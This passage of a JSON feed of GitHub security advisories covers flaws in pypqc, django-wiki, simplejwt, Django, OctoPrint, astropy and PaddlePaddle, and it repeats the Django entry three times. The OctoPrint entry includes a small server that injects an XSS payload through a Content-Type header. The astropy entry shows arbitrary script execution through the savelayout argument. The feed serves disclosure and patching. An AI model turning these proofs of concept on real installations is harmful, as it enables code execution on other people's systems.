href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ</a></li>\n<li><a href=\"https://kyberslash.cr.yp.to\">https://kyberslash.cr.yp.to</a></li>\n<li><a href=\"https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6\">https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6</a></li>\n<li><a href=\"https://www.github.com/PQClean/PQClean/issues/533\">https://www.github.com/PQClean/PQClean/issues/533</a></li>\n<li><a href=\"https://www.github.com/PQClean/PQClean/pull/534#event-11595728485\">https://www.github.com/PQClean/PQClean/pull/534#event-11595728485</a></li>\n<li><a href=\"https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816\">https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816</a></li>\n<li><a href=\"https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220\">https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rc4p-p3j9-6577\">https://github.com/advisories/GHSA-rc4p-p3j9-6577</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rc4p-p3j9-6577",
            "title": "[pypqc] pypqc private key retrieval vulnerability",
            "date_modified": "2024-03-19T18:27:06.000Z",
            "date_published": "2024-02-22T21:41:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rc4p-p3j9-6577"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All historical installations of django-wiki are vulnerable to maliciously crafted article content, that can cause severe use of server CPU through a regular expression loop.</p>\n<h3 id=\"patches\">Patches</h3>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Close off access to create and edit articles by anonymous users.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/django-wiki/django-wiki/security/advisories/GHSA-wj85-w4f4-xh8h\">https://github.com/django-wiki/django-wiki/security/advisories/GHSA-wj85-w4f4-xh8h</a></li>\n<li><a href=\"https://github.com/django-wiki/django-wiki/commit/8e280fd6c0bd27ce847c67b2d216c6cbf920f88c\">https://github.com/django-wiki/django-wiki/commit/8e280fd6c0bd27ce847c67b2d216c6cbf920f88c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28865\">https://nvd.nist.gov/vuln/detail/CVE-2024-28865</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wj85-w4f4-xh8h\">https://github.com/advisories/GHSA-wj85-w4f4-xh8h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wj85-w4f4-xh8h",
            "title": "[wiki] Denial of service via regular expression",
            "date_modified": "2024-03-19T18:30:58.000Z",
            "date_published": "2024-03-18T20:37:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wj85-w4f4-xh8h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>djangorestframework-simplejwt version 5.3.1 and before is vulnerable to information disclosure. A user can access web application resources even after their account has been disabled due to missing user validation checks via the for_user method.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22513\">https://nvd.nist.gov/vuln/detail/CVE-2024-22513</a></li>\n<li><a href=\"https://github.com/dmdhrumilmistry/CVEs/tree/main/CVE-2024-22513\">https://github.com/dmdhrumilmistry/CVEs/tree/main/CVE-2024-22513</a></li>\n<li><a href=\"https://github.com/jazzband/djangorestframework-simplejwt/blob/c791e987332ed5e22a86428160d6372b1d85ffae/rest_framework_simplejwt/tokens.py#L281\">https://github.com/jazzband/djangorestframework-simplejwt/blob/c791e987332ed5e22a86428160d6372b1d85ffae/rest_framework_simplejwt/tokens.py#L281</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5vcc-86wm-547q\">https://github.com/advisories/GHSA-5vcc-86wm-547q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5vcc-86wm-547q",
            "title": "[djangorestframework-simplejwt] Improper Privilege Management in djangorestframework-simplejwt",
            "date_modified": "2024-03-20T14:05:42.000Z",
            "date_published": "2024-03-16T09:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5vcc-86wm-547q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27351\">https://nvd.nist.gov/vuln/detail/CVE-2024-27351</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/5.0/releases/security\">https://docs.djangoproject.com/en/5.0/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/mar/04/security-releases\">https://www.djangoproject.com/weblog/2024/mar/04/security-releases</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vm8q-m57g-pff3\">https://github.com/advisories/GHSA-vm8q-m57g-pff3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vm8q-m57g-pff3",
            "title": "[django] Regular expression denial-of-service in Django",
            "date_modified": "2024-03-18T20:36:42.000Z",
            "date_published": "2024-03-15T21:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vm8q-m57g-pff3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27351\">https://nvd.nist.gov/vuln/detail/CVE-2024-27351</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/5.0/releases/security\">https://docs.djangoproject.com/en/5.0/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/mar/04/security-releases\">https://www.djangoproject.com/weblog/2024/mar/04/security-releases</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vm8q-m57g-pff3\">https://github.com/advisories/GHSA-vm8q-m57g-pff3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vm8q-m57g-pff3",
            "title": "[django] Regular expression denial-of-service in Django",
            "date_modified": "2024-03-18T20:36:42.000Z",
            "date_published": "2024-03-15T21:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vm8q-m57g-pff3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27351\">https://nvd.nist.gov/vuln/detail/CVE-2024-27351</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/5.0/releases/security\">https://docs.djangoproject.com/en/5.0/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/mar/04/security-releases\">https://www.djangoproject.com/weblog/2024/mar/04/security-releases</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vm8q-m57g-pff3\">https://github.com/advisories/GHSA-vm8q-m57g-pff3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vm8q-m57g-pff3",
            "title": "[django] Regular expression denial-of-service in Django",
            "date_modified": "2024-03-18T20:36:42.000Z",
            "date_published": "2024-03-15T21:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vm8q-m57g-pff3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>OctoPrint versions up until and including 1.9.3 contain a vulnerability that allows malicious admins to configure or talk a victim with administrator rights into configuring a webcam snapshot URL which when tested through the \"Test\" button included in the web interface will execute JavaScript code in the victims browser when attempting to render the snapshot image.</p>\n<p>An attacker who successfully talked a victim with admin rights into performing a snapshot test with such a crafted URL could use this to retrieve or modify sensitive configuration settings, interrupt prints or otherwise interact with the OctoPrint instance in a malicious way.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability will be patched in version 1.10.0.</p>\n<h3 id=\"workaround\">Workaround</h3>\n<p>OctoPrint administrators are strongly advised to thoroughly vet who has admin access to their installation and what settings they modify based on instructions by strangers.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Below are the steps to reproduce the vulnerability:</p>\n<ol>\n<li><p>Create a URL that responds with a malicious content type. For example, creating the following python script:</p>\n<pre><code>from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass MyHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-Type', 'image/\"onerror=\"alert(1)\"')\n        self.end_headers()\n        self.wfile.write(b'Ok')\n\ndef run():\n    server_address = ('', 8080)\n    httpd = HTTPServer(server_address, MyHTTPRequestHandler)\n    print('Server listening on 0.0.0.0:8080...')\n    httpd.serve_forever()\n\nif __name__ == '__main__':\n    run()\n</code></pre>\n</li>\n<li><p>Go to OctoPrint settings --&gt; Plugins --&gt; Classic Webcam and enter the URL of that page as the Snapshot URL. </p>\n</li>\n<li><p>Click on the \"Test\" button to trigger XSS. A Javascript alert should appear, demonstrating the actual code injection.</p>\n</li>\n</ol>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-x7mf-wrh9-r76c\">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-x7mf-wrh9-r76c</a></li>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/commit/779894c1bc6478332d14bc9ed1006df1354eb517\">https://github.com/OctoPrint/OctoPrint/commit/779894c1bc6478332d14bc9ed1006df1354eb517</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28237\">https://nvd.nist.gov/vuln/detail/CVE-2024-28237</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x7mf-wrh9-r76c\">https://github.com/advisories/GHSA-x7mf-wrh9-r76c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x7mf-wrh9-r76c",
            "title": "[OctoPrint] XSS via the \"Snapshot Test\" feature in Classic Webcam plugin settings",
            "date_modified": "2024-03-19T18:31:37.000Z",
            "date_published": "2024-03-18T20:29:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x7mf-wrh9-r76c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>RCE due to improper input validation in TranformGraph().to_dot_graph function</p>\n<h3 id=\"details\">Details</h3>\n<p>Due to improper input validation a malicious user can provide a command or a script file as a value to <code>savelayout</code> argument, which will be placed as the first value in a list of arguments passed to <code>subprocess.Popen</code>. \n<a href=\"https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539\">https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539</a>\nAlthough an error will be raised, the command or script will be executed successfully.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-shell\">$ cat /tmp/script\n#!/bin/bash\necho astrorce &gt; /tmp/poc.txt\n</code></pre>\n<pre><code class=\"language-shell\">$ python3\nPython 3.9.2 (default, Feb 28 2021, 17:03:44) \n[GCC 10.2.1 20210110] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; from astropy.coordinates.transformations import TransformGraph\n&gt;&gt;&gt; tg = TransformGraph()\n&gt;&gt;&gt; tg.to_dot_graph(savefn=\"/tmp/1.txt\", savelayout=\"/tmp/script\")\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"/home/u32i/.local/lib/python3.9/site-packages/astropy/coordinates/transformations.py\", line 584, in to_dot_graph\n    stdout, stderr = proc.communicate(dotgraph)\n  File \"/usr/lib/python3.9/subprocess.py\", line 1134, in communicate\n    stdout, stderr = self._communicate(input, endtime, timeout)\n  File \"/usr/lib/python3.9/subprocess.py\", line 1961, in _communicate\n    input_view = memoryview(self._input)\nTypeError: memoryview: a bytes-like object is required, not 'str'\n&gt;&gt;&gt; \n</code></pre>\n<pre><code class=\"language-shell\">$ cat /tmp/poc.txt\nastrorce\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>code execution on the user's machine</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/astropy/astropy/security/advisories/GHSA-h2x6-5jx5-46hf\">https://github.com/astropy/astropy/security/advisories/GHSA-h2x6-5jx5-46hf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-41334\">https://nvd.nist.gov/vuln/detail/CVE-2023-41334</a></li>\n<li><a href=\"https://github.com/astropy/astropy/commit/22057d37b1313f5f5a9b5783df0a091d978dccb5\">https://github.com/astropy/astropy/commit/22057d37b1313f5f5a9b5783df0a091d978dccb5</a></li>\n<li><a href=\"https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539\">https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h2x6-5jx5-46hf\">https://github.com/advisories/GHSA-h2x6-5jx5-46hf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h2x6-5jx5-46hf",
            "title": "[astropy] RCE in TranformGraph().to_dot_graph function",
            "date_modified": "2024-03-18T21:46:20.000Z",
            "date_published": "2024-03-18T20:26:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h2x6-5jx5-46hf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Arbitrary File Overwrite Via Path Traversal in paddlepaddle/paddle before 2.6</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0818\">https://nvd.nist.gov/vuln/detail/CVE-2024-0818</a></li>\n<li><a href=\"https://huntr.com/bounties/85b06a1b-ac0b-4096-a06d-330891570cd9\">https://huntr.com/bounties/85b06a1b-ac0b-4096-a06d-330891570cd9</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/5c50d1a8b97b310cbc36560ec36d8377d6f29d7c\">https://github.com/PaddlePaddle/Paddle/commit/5c50d1a8b97b310cbc36560ec36d8377d6f29d7c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2rp8-hff9-c5wr\">https://github.com/advisories/GHSA-2rp8-hff9-c5wr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2rp8-hff9-c5wr",
            "title": "[paddlepaddle] PaddlePaddle Path Traversal vulnerability",
            "date_modified": "2024-03-17T05:01:26.000Z",
            "date_published": "2024-03-07T15:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2rp8-hff9-c5wr"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}